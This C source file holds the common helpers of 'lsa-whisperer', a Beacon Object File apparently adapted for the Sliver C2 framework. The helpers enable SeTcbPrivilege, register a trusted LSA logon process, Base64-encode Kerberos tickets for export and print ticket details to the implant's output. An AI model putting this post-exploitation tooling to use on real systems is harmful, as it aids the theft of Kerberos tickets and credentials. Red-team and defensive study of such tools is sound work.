/*
 * lsa-whisperer BOF - Common utilities
 * Shared LSA connection, LUID parsing, privilege escalation, and output helpers.
 *
 * Original: https://github.com/dazzyddos/lsawhisper-bof
 * Adapted for Sliver armory integration
 */

#include "../../include/bofdefs.h"
#include "../../include/lsa_structs.h"

/* ============================================================
 * LUID Parsing
 * ============================================================ */

BOOL ParseLUID(const char* str, PLUID luid) {
    if (str == NULL || strlen(str) == 0) {
        luid->LowPart = 0;
        luid->HighPart = 0;
        return TRUE;
    }

    /* Check for hex prefix */
    if (str[0] == '0' && (str[1] == 'x' || str[1] == 'X')) {
        luid->LowPart = strtoul(str, NULL, 16);
    } else {
        luid->LowPart = strtoul(str, NULL, 10);
    }
    luid->HighPart = 0;
    return TRUE;
}

/* ============================================================
 * Privilege Escalation (SeTcbPrivilege)
 * ============================================================ */

BOOL EnableTcbPrivilege(void) {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    if (!LookupPrivilegeValueA(NULL, "SeTcbPrivilege", &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    CloseHandle(hToken);
    return result;
}

/* ============================================================
 * LSA Connection Helpers
 * ============================================================ */

NTSTATUS LsaConnect(PHANDLE hLsa, BOOL trusted) {
    NTSTATUS status;

    if (trusted) {
        LSA_STRING processName;
        LSA_OPERATIONAL_MODE securityMode;
        processName.Buffer = "lsa-whisperer";
        processName.Length = (USHORT)strlen(processName.Buffer);
        processName.MaximumLength = processName.Length + 1;
        status = LsaRegisterLogonProcess(&processName, hLsa, &securityMode);
    } else {
        status = LsaConnectUntrusted(hLsa);
    }

    return status;
}

NTSTATUS LsaLookupPackage(HANDLE hLsa, const char* packageName, PULONG packageId) {
    LSA_STRING pkgName;
    pkgName.Buffer = (char*)packageName;
    pkgName.Length = (USHORT)strlen(packageName);
    pkgName.MaximumLength = pkgName.Length + 1;

    return LsaLookupAuthenticationPackage(hLsa, &pkgName, packageId);
}

/* ============================================================
 * Output Helpers
 * ============================================================ */

void PrintHexBytes(const char* label, PUCHAR data, ULONG length) {
    char hexBuf[4096];
    int offset = 0;

    offset += _snprintf(hexBuf + offset, sizeof(hexBuf) - offset, "%s: ", label);

    for (ULONG i = 0; i < length && offset < (int)(sizeof(hexBuf) - 4); i++) {
        offset += _snprintf(hexBuf + offset, sizeof(hexBuf) - offset, "%02x", data[i]);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "%s\n", hexBuf);
}

void PrintUnicodeString(const char* label, PUNICODE_STRING str) {
    if (str == NULL || str->Buffer == NULL || str->Length == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "%s: (null)\n", label);
        return;
    }

    /* Convert wide string to multibyte for output */
    int mbLen = WideCharToMultiByte(CP_UTF8, 0, str->Buffer, str->Length / sizeof(WCHAR), NULL, 0, NULL, NULL);
    if (mbLen > 0 && mbLen < 2048) {
        char mbBuf[2048];
        WideCharToMultiByte(CP_UTF8, 0, str->Buffer, str->Length / sizeof(WCHAR), mbBuf, mbLen, NULL, NULL);
        mbBuf[mbLen] = '\0';
        BeaconPrintf(CALLBACK_OUTPUT, "%s: %s\n", label, mbBuf);
    }
}

/* ============================================================
 * Base64 Encoding (for ticket export)
 * ============================================================ */

int Base64Encode(const UCHAR* input, ULONG inputLen, char* output, ULONG outputLen) {
    ULONG i, j;
    ULONG encLen = 4 * ((inputLen + 2) / 3);

    if (outputLen < encLen + 1) {
        return -1;
    }

    for (i = 0, j = 0; i < inputLen;) {
        ULONG octet_a = i < inputLen ? input[i++] : 0;
        ULONG octet_b = i < inputLen ? input[i++] : 0;
        ULONG octet_c = i < inputLen ? input[i++] : 0;
        ULONG triple = (octet_a << 16) | (octet_b << 8) | octet_c;

        output[j++] = b64_table[(triple >> 18) & 0x3F];
        output[j++] = b64_table[(triple >> 12) & 0x3F];
        output[j++] = (i > inputLen + 1) ? '=' : b64_table[(triple >> 6) & 0x3F];
        output[j++] = (i > inputLen) ? '=' : b64_table[triple & 0x3F];
    }

    output[j] = '\0';
    return (int)j;
}

/* ============================================================
 * Encryption Type Name Resolver
 * ============================================================ */

const char* GetEncryptionTypeName(LONG encType) {
    switch (encType) {
        case KERB_ETYPE_DES_CBC_CRC:          return "DES-CBC-CRC";
        case KERB_ETYPE_DES_CBC_MD4:          return "DES-CBC-MD4";
        case KERB_ETYPE_DES_CBC_MD5:          return "DES-CBC-MD5";
        case KERB_ETYPE_AES128_CTS_HMAC_SHA1: return "AES128-CTS-HMAC-SHA1";
        case KERB_ETYPE_AES256_CTS_HMAC_SHA1: return "AES256-CTS-HMAC-SHA1";
        case KERB_ETYPE_RC4_HMAC_NT:          return "RC4-HMAC-NT";
        case KERB_ETYPE_RC4_HMAC_NT_EXP:      return "RC4-HMAC-NT-EXP";
        default:                               return "Unknown";
    }
}

/* ============================================================
 * Ticket Flags Formatter
 * ============================================================ */

void PrintTicketFlags(ULONG flags) {
    char flagsBuf[512];
    int offset = 0;

    offset += _snprintf(flagsBuf + offset, sizeof(flagsBuf) - offset, "  Flags      : ");

    if (flags & KERB_TICKET_FLAGS_forwardable)       offset += _snprintf(flagsBuf + offset, sizeof(flagsBuf) - offset, "forwardable ");
    if (flags & KERB_TICKET_FLAGS_forwarded)         offset += _snprintf(flagsBuf + offset, sizeof(flagsBuf) - offset, "forwarded ");
    if (flags & KERB_TICKET_FLAGS_proxiable)         offset += _snprintf(flagsBuf + offset, sizeof(flagsBuf) - offset, "proxiable ");
    if (flags & KERB_TICKET_FLAGS_proxy)             offset += _snprintf(flagsBuf + offset, sizeof(flagsBuf) - offset, "proxy ");
    if (flags & KERB_TICKET_FLAGS_may_postdate)      offset += _snprintf(flagsBuf + offset, sizeof(flagsBuf) - offset, "may-postdate ");
    if (flags & KERB_TICKET_FLAGS_postdated)         offset += _snprintf(flagsBuf + offset, sizeof(flagsBuf) - offset, "postdated ");
    if (flags & KERB_TICKET_FLAGS_invalid)           offset += _snprintf(flagsBuf + offset, sizeof(flagsBuf) - offset, "invalid ");
    if (flags & KERB_TICKET_FLAGS_renewable)         offset += _snprintf(flagsBuf + offset, sizeof(flagsBuf) - offset, "renewable ");
    if (flags & KERB_TICKET_FLAGS_initial)           offset += _snprintf(flagsBuf + offset, sizeof(flagsBuf) - offset, "initial ");
    if (flags & KERB_TICKET_FLAGS_pre_authent)       offset += _snprintf(flagsBuf + offset, sizeof(flagsBuf) - offset, "pre-authent ");
    if (flags & KERB_TICKET_FLAGS_hw_authent)        offset += _snprintf(flagsBuf + offset, sizeof(flagsBuf) - offset, "hw-authent ");
    if (flags & KERB_TICKET_FLAGS_ok_as_delegate)    offset += _snprintf(flagsBuf + offset, sizeof(flagsBuf) - offset, "ok-as-delegate ");
    if (flags & KERB_TICKET_FLAGS_name_canonicalize) offset += _snprintf(flagsBuf + offset, sizeof(flagsBuf) - offset, "name-canonicalize ");

    if (offset > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "%s(0x%08x)\n", flagsBuf, flags);
    }
}

/* ============================================================
 * FILETIME Formatter
 * ============================================================ */

void PrintFileTime(const char* label, LARGE_INTEGER* ft) {
    FILETIME fileTime;
    SYSTEMTIME sysTime;

    fileTime.dwLowDateTime = ft->LowPart;
    fileTime.dwHighDateTime = ft->HighPart;

    /* Manually format since we can't use FileTimeToSystemTime in BOF easily */
    BeaconPrintf(CALLBACK_OUTPUT, "  %-10s : %08x:%08x\n", label, ft->HighPart, ft->LowPart);
}
